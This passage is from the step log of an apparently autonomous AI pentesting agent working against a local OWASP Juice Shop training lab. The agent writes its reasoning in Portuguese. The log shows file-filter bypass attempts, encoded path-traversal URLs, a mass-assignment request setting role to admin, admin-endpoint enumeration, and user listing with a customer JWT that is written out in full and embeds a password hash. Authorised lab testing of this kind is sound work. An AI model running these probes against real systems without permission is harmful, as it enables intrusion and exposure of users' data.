+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/coupons_2013.md.bak\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:59 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"927\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Only .md and .pdf files are allowe",
+      "timestamp": "2026-10-23T01:57:59.275Z"
+    },
+    {
+      "iteration": 15,
+      "thought": "O filtro parece verificar a extensão final. Vou testar bypass com .bak.md ou path com espaço. Também vou testar extensão .PDF maiúscula. Depois sigo para outras categorias.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/coupons_2013.md.bak%2e%6d%64"
+      },
+      "observation": "HTTP 404 GET http://juice-shop:3000/ftp/coupons_2013.md.bak%2e%6d%64\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:01 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"401\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"ENOENT: no such file or d",
+      "timestamp": "2026-10-23T01:58:01.472Z"
+    },
+    {
+      "iteration": 16,
+      "thought": "Bypass de encoding decodificado para .md. Vou tentar path traversal usando um nome que termine em .md mas aponte para outro arquivo, ex: `?path=...` ou nome `../../../etc/passwd%00.md` (null byte já falhou). Outra possibilidade: o servidor resolve symlinks ou permite `%2e%2e`. Vou tentar `ftp/%2e%2e%2fpackage.json.bak.md`.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/%2e%2e%2fpackage.json.bak.md"
+      },
+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/%2e%2e%2fpackage.json.bak.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:05 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1878\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Forbidden\",\n    \"stack\":",
+      "timestamp": "2026-10-23T01:58:05.538Z"
+    },
+    {
+      "iteration": 17,
+      "thought": "Path traversal bloqueado. Vou reportar o achado de /ftp listando arquivos sensíveis e stack trace info disclosure. Depois sigo para outras categorias. Mas antes vou testar sitemap, .well-known, package.json, .env, git, actuator, api-docs.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/package.json"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/package.json\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 01:55:32 GMT\",\"etag\":\"W/\\\"124fa-1a16678737f\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:07 GMT",
+      "timestamp": "2026-10-23T01:58:07.543Z"
+    },
+    {
+      "iteration": 18,
+      "thought": "package.json cai no fallback do SPA. Vou testar paths alternativos e documentação de API, além de .env e .git. Também vou checar /api-docs, /swagger-ui, /openapi.json, /graphql.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api-docs"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api-docs\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/html; charset=utf-8\",\"content-length\":\"3106\",\"etag\":\"W/\\\"c22-H8FH9nKD8DeX/nvIRrte6ZjP2a4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:09 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n\n<!-- HTML for static distribution bund",
+      "timestamp": "2026-10-23T01:58:09.536Z"
+    },
+    {
+      "iteration": 19,
+      "thought": "Swagger UI exposto! Isso é Sensitive Data Exposure e facilita mapeamento da API. Vou buscar a especificação OpenAPI/Swagger JSON.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/swagger-ui"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/swagger-ui\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 01:55:32 GMT\",\"etag\":\"W/\\\"124fa-1a16678737f\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:11 GMT\",",
+      "timestamp": "2026-10-23T01:58:11.267Z"
+    },
+    {
+      "iteration": 20,
+      "thought": "/api-docs retornou Swagger UI. Preciso do JSON da especificação. Vou tentar /api-docs/swagger-ui-init.js, /api-docs/swagger-ui-standalone-preset.js, /api-docs/swagger.json, /v2/api-docs, /openapi.json.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api-docs/swagger.json"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api-docs/swagger.json\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/html; charset=utf-8\",\"content-length\":\"3106\",\"etag\":\"W/\\\"c22-H8FH9nKD8DeX/nvIRrte6ZjP2a4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:13 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n\n<!-- HTML for static dist",
+      "timestamp": "2026-10-23T01:58:13.138Z"
+    },
+    {
+      "iteration": 21,
+      "thought": "/api-docs/swagger.json retornou o HTML do Swagger UI. A especificação pode estar em outro path. Vou inspecionar o HTML da /api-docs para achar a URL do JSON (swagger-ui-init.js ou url:).",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api-docs/swagger-ui-init.js"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api-docs/swagger-ui-init.js\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/javascript; charset=utf-8\",\"content-length\":\"5457\",\"etag\":\"W/\\\"1551-9fDqyGf7xN37NQs+1pPTJ0h2bOE\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:15 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n\nwindo",
+      "timestamp": "2026-10-23T01:58:14.989Z"
+    },
+    {
+      "iteration": 22,
+      "thought": "Swagger UI revela API B2B v2 em /b2b/v2/orders. Vou inspecionar todo o swagger-ui-init.js para ver endpoints e schemas. Depois testo /b2b/v2/orders. Também vou notar a referência a endpoints XML-based anteriores — possível XXE.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/b2b/v2/orders"
+      },
+      "observation": "HTTP 401 GET http://juice-shop:3000/b2b/v2/orders\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:16 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"234\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"No Authorization header was found\",\n    \"nam",
+      "timestamp": "2026-10-23T01:58:16.833Z"
+    },
+    {
+      "iteration": 23,
+      "thought": "Endpoint B2B requer autenticação. Vou testar com o JWT do usuário comum. Também preciso ver o schema completo do swagger para entender o body esperado.",
+      "action": {
+        "action": "make_request",
+        "method": "POST",
+        "url": "http://localhost:3000/b2b/v2/orders",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s",
+          "Content-Type": "application/json"
+        },
+        "body": {}
+      },
+      "observation": "HTTP 200 POST http://juice-shop:3000/b2b/v2/orders\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"86\",\"etag\":\"W/\\\"56-KRQMHlbHL5y4KbboVF1y8wxc/bc\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:22 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"orderNo\": \"292c1406f9527",
+      "timestamp": "2026-10-23T01:58:22.278Z"
+    },
+    {
+      "iteration": 24,
+      "thought": "POST /b2b/v2/orders aceitou body vazio e criou pedido. Preciso do schema para testar mass assignment e business logic. Vou baixar o swagger-ui-init.js completo e inspecionar schemas.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api-docs/swagger-ui-init.js"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api-docs/swagger-ui-init.js\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/javascript; charset=utf-8\",\"content-length\":\"5457\",\"etag\":\"W/\\\"1551-9fDqyGf7xN37NQs+1pPTJ0h2bOE\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:23 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n\nwindo",
+      "timestamp": "2026-10-23T01:58:23.839Z"
+    },
+    {
+      "iteration": 25,
+      "thought": "A resposta é truncada no body. Preciso do schema completo. Vou usar curl-like via make_request com range ou simplesmente buscar substring. Como a ferramenta não permite grep, vou tentar obter via parâmetro ?format=json ou /b2b/v2/orders schema. Outra abordagem: enviar POST com campos comuns de Mass Assignment para ver o que é aceito.",
+      "action": {
+        "action": "make_request",
+        "method": "POST",
+        "url": "http://localhost:3000/b2b/v2/orders",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "orderNo": "hacked",
+          "paymentDue": "2099-01-01",
+          "discount": 9999,
+          "role": "admin"
+        }
+      },
+      "observation": "HTTP 200 POST http://juice-shop:3000/b2b/v2/orders\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"86\",\"etag\":\"W/\\\"56-xnP6yA8VASQs8dOgV8s1Uz0fHwo\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:29 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"orderNo\": \"da52f5d337322",
+      "timestamp": "2026-10-23T01:58:29.418Z"
+    },
+    {
+      "iteration": 26,
+      "thought": "Campos extras são ignorados; orderNo e paymentDue são gerados pelo servidor. Preciso do schema para testar corretamente. Vou tentar obter o swaggerDoc via /api-docs?url=/b2b/v2/swagger.json ou verificar a referência no HTML. Também vou procurar por /swagger.json, /v3/api-docs.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api-docs?url=/b2b/v2/swagger.json"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api-docs?url=/b2b/v2/swagger.json\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/html; charset=utf-8\",\"content-length\":\"3106\",\"etag\":\"W/\\\"c22-H8FH9nKD8DeX/nvIRrte6ZjP2a4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:31 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n\n<!-- HTML for",
+      "timestamp": "2026-10-23T01:58:31.516Z"
+    },
+    {
+      "iteration": 27,
+      "thought": "O Swagger UI está embedado. A especificação pode estar hard-coded no swagger-ui-init.js. Como o body é truncado, vou tentar acessar diretamente /api-docs/swagger-ui-init.js com header Accept: application/json ou usar /api-docs/swagger-ui-init.js?format=text — mas a ferramenta já me deu conteúdo parcial. Vou seguir adiante com outros testes. Já descobri: /ftp com listagem pública, Swagger UI com /b2b/v2 exposto, info disclosure em erros. Vou testar categorias principais: Broken Access Control (administration), Injection (search), JWT, Mass Assignment (perfil), SSRF, XSS. Primeiro vou testar /#/administration e /rest/admin/application-configuration.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/admin/application-configuration"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-configuration\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"21770\",\"etag\":\"W/\\\"550a-OEo3agZPnY9Z7Todze3/X9Rt2J8\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:34 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n",
+      "timestamp": "2026-10-23T01:58:34.461Z"
+    },
+    {
+      "iteration": 28,
+      "thought": "/rest/admin/application-configuration expõe configuração administrativa sem autenticação — Sensitive Data Exposure. Vou baixar o restante via /rest/admin/application-version para obter a versão exata e depois testar administration, JWT e busca por injeção.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/admin/application-version"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-version\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"20\",\"etag\":\"W/\\\"14-tCKnqyl1elU2Vzkywa8P9qRtJx4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:36 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"version\"",
+      "timestamp": "2026-10-23T01:58:36.107Z"
+    },
+    {
+      "iteration": 29,
+      "thought": "Versão 19.2.1 do Juice Shop. Vou reportar a exposição de config e versão. Depois testo /rest/administration com JWT e sem JWT, e a rota /#/administration.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/administration"
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/administration\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:37 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1849\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Unexpected path: /rest/administration",
+      "timestamp": "2026-10-23T01:58:37.490Z"
+    },
+    {
+      "iteration": 30,
+      "thought": "/rest/administration não existe; o Angular roteia para /#/administration. Vou navegar para /#/administration para ver se acessível.",
+      "action": {
+        "action": "navigate",
+        "url": "http://localhost:3000/#/administration"
+      },
+      "observation": "Navegou para http://juice-shop:3000/#/administration. Título: \"OWASP Juice Shop\". URL atual: http://juice-shop:3000/#/administration",
+      "timestamp": "2026-10-23T01:58:39.196Z"
+    },
+    {
+      "iteration": 31,
+      "thought": "Vou ler a página para ver se o painel admin é renderizado ou redirecionado.",
+      "action": {
+        "action": "read_page"
+      },
+      "observation": "URL: http://juice-shop:3000/#/administration\nTítulo: OWASP Juice Shop\nConteúdo:\nThis website uses fruit cookies to ensure you get the juiciest tracking experience. But me wait!\nMe want it!\nmenu\nOWASP Juice Shop\nclose\nsearch\nlanguage\nYou successfully solved a challenge: Confidential Document (Access a confidential document.)\ncode\nJump to related coding challenge\nX\n 403\nYou are not allowed to access this page!",
+      "timestamp": "2026-10-23T01:58:40.115Z"
+    },
+    {
+      "iteration": 32,
+      "thought": "Acesso à /#/administration negado (403) sem token, mas o backend registrou que resolvi um desafio (Confidential Document) — isso é metagame do Juice Shop. Preciso testar com JWT do usuário comum e também tentar bypass. Antes disso, vou fazer login na aplicação para ter token válido no browser e extrair.",
+      "action": {
+        "action": "extract_tokens"
+      },
+      "observation": "{\n  \"jwt\": null,\n  \"bearerToken\": null,\n  \"cookies\": {\n    \"continueCode\": \"4KgJvj8OVep5MPoLY26wby9dx3cYS7bTk6TEDAl4BkE17QnZqWRXzxN3mDar\",\n    \"language\": \"en\"\n  },\n  \"currentUrl\": \"http://juice-shop:3000/#/administration\"\n}",
+      "timestamp": "2026-10-23T01:58:41.912Z"
+    },
+    {
+      "iteration": 33,
+      "thought": "Não há token no browser ainda. Vou navegar para login, preencher com as credenciais do Jim (o token indica email jim@juice-sh.op, mas não sei a senha). O AppMap já tem token JWT, então posso injetar no localStorage ou usá-lo direto. Para testar /#/administration autenticado, vou setar o token no localStorage via evaluate? Não tenho evaluate. Posso usar make_request com Authorization. Vou testar endpoints admin REST com o token.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/admin/application-configuration",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-configuration\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"21770\",\"etag\":\"W/\\\"550a-OEo3agZPnY9Z7Todze3/X9Rt2J8\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:46 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n",
+      "timestamp": "2026-10-23T01:58:46.251Z"
+    },
+    {
+      "iteration": 34,
+      "thought": "/rest/admin/application-configuration acessível sem autenticação. Vou testar /api/Users/ (REST API do loopback) para IDOR e mass assignment. O Juice Shop usa LoopBack/Express com modelos. Vou começar com /api/Users/.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api/Users/"
+      },
+      "observation": "HTTP 401 GET http://juice-shop:3000/api/Users/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:47 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"234\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"No Authorization header was found\",\n    \"name\":",
+      "timestamp": "2026-10-23T01:58:47.818Z"
+    },
+    {
+      "iteration": 35,
+      "thought": "/api/Users/ requer auth. Vou testar com JWT comum e depois tentar IDOR com IDs. Também testo /api/Products/, /api/BasketItems/, etc.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api/Users/",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Users/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"6070\",\"etag\":\"W/\\\"17b6-IiRPAtOQ+eC1R3OaDinwTtxdJFc\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:51 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  \"d",
+      "timestamp": "2026-10-23T01:58:51.724Z"
+    },
+    {
+      "iteration": 36,
+      "thought": "/api/Users/ retorna todos os usuários com hashes de senha omitidos (neste trecho), mas é IDOR/horizontal de leitura — um customer lê dados de admin. Vou buscar usuário específico e ver se há campos adicionais como totpSecret, password. Também testo /api/Users/1.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api/Users/1",
+        "headers": {
